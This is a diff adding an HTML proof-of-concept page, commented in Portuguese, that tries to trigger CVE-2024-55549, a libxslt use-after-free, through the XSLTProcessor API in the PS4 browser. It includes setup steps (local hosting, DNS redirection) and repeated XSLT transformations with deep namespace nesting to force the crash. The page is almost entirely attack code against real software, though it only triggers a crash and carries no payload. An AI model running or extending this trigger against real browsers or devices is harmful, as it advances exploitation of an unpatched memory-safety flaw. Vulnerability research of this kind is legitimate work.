@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+<!--
+  PoC: CVE-2024-55549
+  Alvo: libxslt < 1.1.43 (xsltGetInheritedNsList UAF)
+  Vetor: XSLTProcessor JavaScript API (sem JIT)
+  Trigger: exclude-result-prefixes com namespace aliasing e reentrada
+  
+  Commit de fix: 46041b65f2fbddf5c284ee1a1332fa2c515c0515
+  P0 Issue: https://project-zero.issues.chromium.org/issues/382015274
+  
+  Objetivo no PS4: Verificar se SceNKWebProcess crasha.
+  Se crashar => libxslt < 1.1.43 está presente => bug existe.
+  
+  Como usar no PS4:
+  1. Hospedar este arquivo em servidor HTTP local
+  2. Redirecionar DNS do PS4 para o servidor
+  3. Abrir no browser do PS4 via User's Guide ou URL direta
+  4. Observar se aparece "Out of Memory" ou crash do browser
+-->
+<head>
+  <meta charset="UTF-8">
+  <title>CVE-2024-55549 PoC - libxslt xsltGetInheritedNsList UAF</title>
+  <style>
+    body { background: #0a0a0a; color: #00ff88; font-family: monospace; padding: 20px; }
+    #log { background: #111; border: 1px solid #00ff88; padding: 15px; min-height: 200px; }
+    .ok   { color: #00ff88; }
+    .fail { color: #ff4444; }
+    .info { color: #ffaa00; }
+  </style>
+</head>
+<body>
+  <h2>CVE-2024-55549 — libxslt xsltGetInheritedNsList UAF</h2>
+  <p>Testando libxslt via XSLTProcessor...</p>
+  <div id="log"></div>
+
+<script>
+"use strict";
+
+const log = (msg, cls) => {
+  const d = document.getElementById("log");
+  d.innerHTML += `<div class="${cls||'info'}">[${new Date().toISOString()}] ${msg}</div>`;
+};
+
+log("Iniciando CVE-2024-55549 PoC...");
+
+/*
+ * ESTRATÉGIA DO BUG:
+ * 
+ * xsltGetInheritedNsList() itera pelos namespaces do nó corrente,
+ * filtrando os que estão em exclude-result-prefixes.
+ * Ela armazena PONTEIROS diretos para os xmlNs structs do documento XML.
+ *
+ * O UAF ocorre quando:
+ * 1. Um stylesheet XSLT define exclude-result-prefixes
+ * 2. Usa namespace-aliasing (xsl:namespace-alias)
+ * 3. Processa elementos com namespaces herdados
+ * 4. Durante a transformação, os xmlNs do documento fonte são
+ *    liberados enquanto ret[] ainda os referencia
+ *
+ * Construção do trigger:
+ * - XML com múltiplos namespaces aninhados
+ * - XSLT com exclude-result-prefixes sobre esses namespaces
+ * - xsl:namespace-alias forçando resolução de ns durante transform
+ * - Loop de transformações para amplificar a janela de UAF
+ */
+
+// ============================================================
+// DOCUMENTO XML ALVO - múltiplos namespaces aninhados
+// ============================================================
+const xmlStr = `<?xml version="1.0" encoding="UTF-8"?>
+<root
+  xmlns="http://example.com/default"
+  xmlns:a="http://example.com/ns-a"
+  xmlns:b="http://example.com/ns-b"
+  xmlns:c="http://example.com/ns-c"
+  xmlns:d="http://example.com/ns-d"
+  xmlns:e="http://example.com/ns-e">
+  <a:parent
+    xmlns:f="http://example.com/ns-f"
+    xmlns:g="http://example.com/ns-g">
+    <b:child
+      xmlns:h="http://example.com/ns-h"
+      xmlns:i="http://example.com/ns-i">
+      <c:leaf
+        xmlns:j="http://example.com/ns-j"
+        xmlns:k="http://example.com/ns-k">
+        <d:deep
+          xmlns:l="http://example.com/ns-l"
+          xmlns:m="http://example.com/ns-m">
+          text content
+        </d:deep>
+      </c:leaf>
+    </b:child>
+  </a:parent>
+  <a:parent>
+    <b:child>repeat</b:child>
+  </a:parent>
+</root>`;
+
+// ============================================================
+// STYLESHEET 1 - Trigger principal do UAF
+// exclude-result-prefixes com namespace aliasing
+// ============================================================
+const xsltStr1 = `<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:a="http://example.com/ns-a"
+  xmlns:b="http://example.com/ns-b"
+  xmlns:c="http://example.com/ns-c"
+  xmlns:d="http://example.com/ns-d"
+  xmlns:e="http://example.com/ns-e"
+  xmlns:f="http://example.com/ns-f"
+  xmlns:g="http://example.com/ns-g"
+  xmlns:h="http://example.com/ns-h"
+  xmlns:i="http://example.com/ns-i"
+  xmlns:j="http://example.com/ns-j"
+  xmlns:k="http://example.com/ns-k"
+  xmlns:l="http://example.com/ns-l"
+  xmlns:m="http://example.com/ns-m"
+  xmlns:out="http://example.com/output"
+  xmlns:alias="http://example.com/alias"
+  exclude-result-prefixes="a b c d e f g h i j k l m alias">
+
+  <!-- namespace-alias: força resolução de ns durante transformação -->
+  <xsl:namespace-alias stylesheet-prefix="alias" result-prefix="out"/>
+
+  <xsl:template match="/">
+    <out:result>
+      <xsl:apply-templates select="//*"/>
+    </out:result>
+  </xsl:template>
+
+  <!-- Template que aciona xsltGetInheritedNsList com herança de ns -->
+  <xsl:template match="*">
+    <xsl:element name="{local-name()}" namespace="http://example.com/output">
+      <!-- copy-of força cópia de namespaces herdados -->
+      <xsl:copy-of select="namespace::*"/>
+      <!-- for-each em context diferente -->
+      <xsl:for-each select="ancestor::*">
+        <xsl:copy-of select="namespace::*"/>
+      </xsl:for-each>
+      <xsl:value-of select="."/>
+    </xsl:element>
+  </xsl:template>
+
+</xsl:stylesheet>`;
+
+// ============================================================
+// STYLESHEET 2 - Variante com xsl:include simulado via
+// múltiplos templates que reusam namespaces
+// ============================================================
+const xsltStr2 = `<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:ns1="http://example.com/ns-a"
+  xmlns:ns2="http://example.com/ns-b"
+  xmlns:ns3="http://example.com/ns-c"
+  exclude-result-prefixes="ns1 ns2 ns3">
+
+  <xsl:template match="/">
+    <result>
+      <!-- Processamento que força xsltGetInheritedNsList em loop -->
+      <xsl:for-each select="//*[namespace-uri() != '']">
+        <item>
+          <xsl:attribute name="ns">
+            <xsl:value-of select="namespace-uri()"/>
+          </xsl:attribute>
+          <!-- namespace::* aciona coleta de namespaces herdados -->
+          <xsl:for-each select="namespace::*">
+            <xsl:value-of select="name()"/>
+            <xsl:text>:</xsl:text>
+            <xsl:value-of select="."/>
+            <xsl:text> </xsl:text>
+          </xsl:for-each>
+        </item>
+      </xsl:for-each>
+    </result>
+  </xsl:template>
+
+</xsl:stylesheet>`;
+
+// ============================================================
+// Função para parsear XML/XSLT em DOMParser
+// ============================================================
+function parseXML(str) {
+  const parser = new DOMParser();
+  return parser.parseFromString(str, "application/xml");
+}
+
+// ============================================================
+// Função principal de trigger
+// ============================================================
+function triggerCVE_2024_55549() {
+  try {
+    log("Parseando XML fonte...");
+    const xmlDoc = parseXML(xmlStr);
+    
+    if (xmlDoc.documentElement.nodeName === "parsererror") {
+      log("ERRO: Falha ao parsear XML: " + xmlDoc.documentElement.textContent, "fail");
+      return false;
+    }
+    log("XML parseado com sucesso. Namespaces no root: " + 
+        xmlDoc.documentElement.attributes.length, "ok");
+
+    log("Criando XSLTProcessor...");
+    
+    if (typeof XSLTProcessor === "undefined") {
+      log("XSLTProcessor não disponível neste browser!", "fail");
+      return false;
+    }
+    
+    // ---- TENTATIVA 1: Stylesheet com exclude-result-prefixes ----
+    log("[Variante 1] Testando stylesheet com exclude-result-prefixes + namespace-alias...");
+    const xsltDoc1 = parseXML(xsltStr1);
+    const proc1 = new XSLTProcessor();
+    proc1.importStylesheet(xsltDoc1);
+    
+    // Transformar múltiplas vezes para amplificar a chance de UAF
+    for (let i = 0; i < 50; i++) {
+      const result1 = proc1.transformToFragment(xmlDoc, document);
+      if (!result1) {
+        log(`Iteração ${i}: transformToFragment retornou null`, "fail");
+      }
+    }
+    log("[Variante 1] 50 transformações concluídas sem crash visível", "ok");
+
+    // ---- TENTATIVA 2: Stylesheet com namespace::* traversal ----
+    log("[Variante 2] Testando namespace::* com for-each aninhado...");
+    const xsltDoc2 = parseXML(xsltStr2);
+    const proc2 = new XSLTProcessor();
+    proc2.importStylesheet(xsltDoc2);
+    
+    for (let i = 0; i < 50; i++) {
+      const result2 = proc2.transformToDocument(xmlDoc);
+      if (!result2) {
+        log(`Iteração ${i}: transformToDocument retornou null`, "fail");
+      }
+    }
+    log("[Variante 2] 50 transformações concluídas", "ok");
+
+    // ---- TENTATIVA 3: Intensificar com XML mais profundo ----
+    log("[Variante 3] XML com namespace depth máxima...");
+    
+    // Criar XML com namespaces em cascata profunda
+    let deepXml = '<?xml version="1.0"?>\n';
+    let nsDecls = '';
+    for (let n = 0; n < 30; n++) {
+      nsDecls += ` xmlns:n${n}="http://ns.example.com/${n}"`;
+    }
+    deepXml += `<root${nsDecls}>\n`;
+    for (let d = 0; d < 20; d++) {
+      let levelNs = '';
+      for (let n = 0; n < 10; n++) {
+        levelNs += ` xmlns:l${d}n${n}="http://level${d}.ns${n}.example.com/"`;
+      }
+      deepXml += `  <n${d % 30}:level${levelNs}>\n`;
+    }
+    deepXml += '    <leaf>data</leaf>\n';
+    for (let d = 19; d >= 0; d--) {
+      deepXml += `  </n${d % 30}:level>\n`;
+    }
+    deepXml += '</root>';
+    
+    const deepDoc = parseXML(deepXml);
+    
+    // Stylesheet que exclui todos os namespaces (máximo stress)
+    let excludePfx = '';
+    for (let n = 0; n < 30; n++) excludePfx += ` n${n}`;
+    
+    const deepXslt = `<?xml version="1.0"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  ${Array.from({length:30}, (_,n) => `xmlns:n${n}="http://ns.example.com/${n}"`).join('\n  ')}
+  exclude-result-prefixes="${excludePfx.trim()}">
+  <xsl:template match="/">
+    <out>
+      <xsl:for-each select="//*">
+        <xsl:copy-of select="namespace::*"/>
+      </xsl:for-each>
+    </out>
+  </xsl:template>
+</xsl:stylesheet>`;
+    
+    const deepXsltDoc = parseXML(deepXslt);
+    const proc3 = new XSLTProcessor();
+    proc3.importStylesheet(deepXsltDoc);
+    
+    for (let i = 0; i < 100; i++) {
+      proc3.transformToDocument(deepDoc);
+    }
+    log("[Variante 3] 100 transformações com deep XML concluídas", "ok");
+
+    log("=== RESULTADO: Nenhum crash detectado via JS ===", "info");
+    log("Isso pode significar:", "info");
+    log("  (a) libxslt >= 1.1.43 está presente no PS4 13.04 (patched)", "info");
+    log("  (b) O crash ocorreu no processo SceNKWebProcess mas foi recuperado", "info");
+    log("  (c) O trigger precisa de refinamento adicional", "info");
+    log("Verificar: logs do PS4 ou comportamento do browser (crash/reload = BUG PRESENTE)", "info");
+    
+    return true;
+    
+  } catch (e) {
+    log("EXCEÇÃO JS: " + e.toString(), "fail");
+    log("Stack: " + (e.stack || "N/A"), "fail");
+    return false;
+  }
+}
+
+// ============================================================
+// Executar após load
+// ============================================================
+window.addEventListener("load", function() {
+  log("DOM carregado. Verificando suporte...");
+  
+  setTimeout(function() {
+    const result = triggerCVE_2024_55549();
+    if (result) {
+      log("PoC completou execução.", "ok");
+    } else {
+      log("PoC falhou na execução.", "fail");
+    }
+  }, 500);
+});
+</script>
+</body>
+</html>
